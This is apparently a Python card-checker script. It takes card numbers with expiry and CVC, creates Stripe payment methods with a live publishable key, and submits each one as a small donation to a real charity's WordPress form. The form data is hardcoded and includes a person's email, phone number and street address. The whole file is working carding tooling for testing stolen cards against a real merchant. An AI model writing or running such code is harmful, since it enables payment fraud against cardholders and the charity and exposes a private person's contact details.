import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
			'authority': 'api.stripe.com',
			'accept': 'application/json',
			'accept-language': 'en-US,en;q=0.9,my;q=0.8',
			'content-type': 'application/x-www-form-urlencoded',
			'origin': 'https://js.stripe.com',
			'referer': 'https://js.stripe.com/',
			'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
			'sec-ch-ua-mobile': '?1',
			'sec-ch-ua-platform': '"Android"',
			'sec-fetch-dest': 'empty',
			'sec-fetch-mode': 'cors',
			'sec-fetch-site': 'same-site',
			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	}

	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51NJgOXCjU8lO8MWc81K66yGhcm9C0UPHTGgfypyAMPmRU79JIeCDD5mPWBGOU2v8hcYshCsaVmnqNzl50NQEe4p100CxLWdRv1'
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

	pm = r1.json()['id']

	cookies = {
			'__stripe_mid': '85f76f62-4e84-483c-840d-4a9a6bccb364a70659',
			'__stripe_sid': 'c3ff8653-68d0-4458-9df5-653c0407246561f5f3',
	}

	headers = {
			'authority': 'www.destinyafrica.org',
			'accept': '*/*',
			'accept-language': 'en-US,en;q=0.9,my;q=0.8',
			'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
			# 'cookie': '__stripe_mid=cd04496a-fc78-49f6-99fc-6310e3e55e6221dc47; __stripe_sid=b3b7888f-21a6-4ff7-a3cf-b0242d6fcf37cce97e',
			'origin': 'https://www.destinyafrica.org',
			'referer': 'https://www.destinyafrica.org/donation/',
			'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
			'sec-ch-ua-mobile': '?1',
			'sec-ch-ua-platform': '"Android"',
			'sec-fetch-dest': 'empty',
			'sec-fetch-mode': 'cors',
			'sec-fetch-site': 'same-origin',
			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
			'x-requested-with': 'XMLHttpRequest',
	}

	params = {
			't': '1725543413811',
	}

	data = {
			'data': '__fluent_form_embded_post_id^%^3D2808^%^26_fluentform_3_fluentformnonce^%^3D3627c9222e^%^26_wp_http_referer^%^3D^%^252Fdonation^%^252F^%^26custom-payment-amount^%^3D10^%^26multi_select^%^255B^%^255D^%^3DAdministration^%^26input_text_3^%^3Dee^%^2520Bam^%^26email^%^3Dkyaw151199^%^2540gmail.com^%^26phone^%^3D2154912139^%^26address_1^%^255Baddress_line_1^%^255D^%^3D1432^%^2520Easton^%^2520Rd^%^26address_1^%^255Bcity^%^255D^%^3DWarrington^%^26address_1^%^255Bstate^%^255D^%^3DPennsylvania^%^26address_1^%^255Bzip^%^255D^%^3D18976^%^26address_1^%^255Bcountry^%^255D^%^3DUS^%^26payment_method^%^3Dstripe^%^26item__3__fluent_checkme_^%^3D^%^26g-recaptcha-response^%^3D03AFcWeA4-XJngQXQcPR2xxemXBjV8pCiKPeScEXy6m94Lyz_c_N07YtL3QGmI01NWN2glhXhLhjpldWA0aPgeOUjZVhmsi0Iawek8R7oKkqHA1blLs-Wdjudly1Q-sv9QvgaDrnX-YfJ3tjn3Y-0cufZQN0dG2Jbw2K4JlWgigzZeRQGA-TyuwpTQgiAC9r5T9DY3s3REwHt1X3dLYCfB43Q8vcNX3i6p1mn2vk3lwb_7pxv5IVtNgJ7EXHxl2BmeqPoJ-Voc_Z2tPSUcL8K_wqtOUTRXRZkj5zdB0BLFuSk_EBHd1Ek077ccIM3lUatOxuVJ9V5atCh5qooZylsaQme3LPZEED3JAa79A0hf6MqhidQKaoO9YXNPBi4WAuIaRjWR6ovBexrXAFUkh-mf4O9apaMnFcdlLbJ9Zn_dq4LY0NMydXGk9G515qON9FHua9q4-Q7qmzWq3Z7z0l9xTcUwwUsash64NNPen1POsZqEf-j_cD8mdnIBU-rTsatyBwiSbMoA9JuTscsRB_zm-C2IpIPLnkdtqLB2LSYyJUV9VoVUAwrfq0HqN7WVhJoWUY3JFk7u3KgIwSfljsPK-1BkxKqg0nrG4mNBxf-0SU5BPGpwp56fU9AOetLmvrdmWASicxT6AaR5GDeRJqRPAP-Krt8H7911Ykz0vZzKbwfamNDGP_KuGXheiUSqHsmhWHOUgWMY4JRafeGtl7Pj-TqPdr92dY2k5uDYVH5pGU3fek5nvUfxdbeTgPIjWkp18cEAnNtvJK8wqau42pBwBQVIBC6qxEdqrgBqZF-2sjNk-6p5vbutVeNxwv2lHkP43EWn95nWMXxwgozTlXsVkA_VK33KH51w9Q^%^26__stripe_payment_method_id='+str(pm)+'',
			'action': 'fluentform_submit',
			'form_id': '7',
	}
	
	r2 = requests.post(
			'https://www.destinyafrica.org/wp-admin/admin-ajax.php',
			params=params,
			cookies=cookies,
			headers=headers,
			data=data,
	)
	return (r2.json())